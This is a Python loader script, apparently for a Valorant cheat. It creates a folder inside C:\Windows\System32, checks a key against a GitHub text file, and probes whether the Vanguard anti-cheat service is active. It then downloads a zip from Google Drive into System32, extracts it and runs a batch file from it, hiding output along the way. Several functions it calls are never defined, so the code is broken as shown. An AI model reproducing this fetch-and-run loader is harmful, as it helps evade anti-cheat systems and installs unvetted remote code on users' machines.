import subprocess
import sys
import os
import winreg
import requests
import sys
import ctypes
import os
import sys
import shutil
import os
import gdown
os.system('cls')

dcnmwxdr = r'C:\Windows\System32\NTLK'
if not os.path.exists(dcnmwxdr):
    os.makedirs(dcnmwxdr)
    os.system('cls')
result = check_string_in_url("https://raw.githubusercontent.com/prv1dripwookxes201350/installer/refs/heads/main/uniqueidaes.txt", file_contentsx1)
os.system('cls')
def install_libraryr():
    try:
        subprocess.run(["py", "-3.11", "-m", "pip", "install", "windows-capture==1.4.2"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass
def install_libraryr2():
    try:
        subprocess.run(["py", "-3.11", "-m", "pip", "install", "screeninfo==0.8.1"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        pass
print("Installing a library please wait...")
install_libraryr()
install_libraryr2()
def check_service_status(service_name):
    try:
        # Run the 'sc query' command to check the service status
        result = subprocess.run(
            ["sc", "query", service_name],
            capture_output=True,
            text=True
        )

        # Check if the command was successful
        if result.returncode != 0:
            return f""

        # Analyze the output to determine the service state
        output = result.stdout
        if "RUNNING" in output:
            state = "running"
            os.system('cls')
            print("Error, valorant anti-cheat is running.")
            input()
            exit()
        elif "STOPPED" in output:
            state = "stopped"
        else:
            state = "unknown"

        # Check the start type (manual, automatic, disabled)
        config_result = subprocess.run(
            ["sc", "qc", service_name],
            capture_output=True,
            text=True
        )

        if config_result.returncode != 0:
            start_type = f""
        else:
            config_output = config_result.stdout
            if "AUTO_START" in config_output:
                start_type = "automatic"
                os.system('cls')
                print("Error, VGC service is set to automatic.")
                input()
                exit()
            elif "DEMAND_START" in config_output:
                start_type = "manual"
            elif "DISABLED" in config_output:
                start_type = "disabled"
            else:
                start_type = "unknown"

        return f""

    except Exception as e:
        return f""


service_name = "vgc"
status = check_service_status(service_name)
def delete_files_if_condition(file):
    target_dir = r"C:\Windows\System32\NTLK" 

    if not os.path.exists(file): 
        if os.path.exists(target_dir) and os.path.isdir(target_dir):
            for file_name in os.listdir(target_dir):
                file_path = os.path.join(target_dir, file_name)
                try:
                    if os.path.isfile(file_path):
                        os.remove(file_path)
                except Exception as e:
                    print(f"")
check_file = r"C:\Windows\System32\v1updateapril52025v2.txt"
delete_files_if_condition(check_file)

def download_file_from_google_drive(url, output_path):
    if not os.path.exists(output_path):
        gdown.download(url, output=output_path, quiet=True)

if not os.path.exists("C:\\Windows\\System32\\NTLK\\aesv9.1.py"):
    print("Installing AES V1 please wait...")
    download_file_from_google_drive("https://drive.google.com/uc?id=1OtRku8N2-7P5nOlbHoDvgz-md9-OaS6M", "C:\\Windows\\System32\\NTLK\\v1x2.zip")
    zip_file = r'C:\Windows\System32\NTLK\v1x2.zip'
    extract_dir = r'C:\Windows\System32\NTLK'
    extract_zip(zip_file, extract_dir)
    os.remove(zip_file)


import os
import shutil
os.system('cls')
import subprocess
def create_check_file(file):
    try:
        with open(file, "w") as f:
            f.write("Installation confirmed.")
    except Exception as e:
        print(f"Error creating file: {e}")
create_check_file(check_file)


def run_batch_file(batch_file_path):
    try:
        subprocess.run([batch_file_path], shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error")
    else:
        print("")
os.system('cls')
batch_file_path = r"C:\Windows\System32\NTLK\aesv1.bat"
os.system('cls')

try:
    subprocess.Popen(['start', 'cmd', '/c', batch_file_path], shell=True)
except Exception as e:
    print("Error")

os.system('cls')

os._exit(0)
sys.exit()
